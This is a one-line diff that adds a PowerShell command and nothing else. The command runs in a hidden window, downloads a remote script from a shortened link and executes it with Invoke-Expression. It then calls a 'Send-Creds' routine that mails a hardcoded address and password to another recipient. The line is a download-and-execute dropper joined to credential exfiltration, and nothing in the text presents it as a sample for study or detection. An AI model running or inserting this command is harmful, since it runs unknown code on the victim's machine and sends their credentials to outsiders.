@@ -1,0 +1,1 @@
+Powershell -WindowStyle Hidden Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2eA6vFE'); Send-Creds -From 'correo@gmail.com' -Pass '!pass123' -To 'email@example.com'
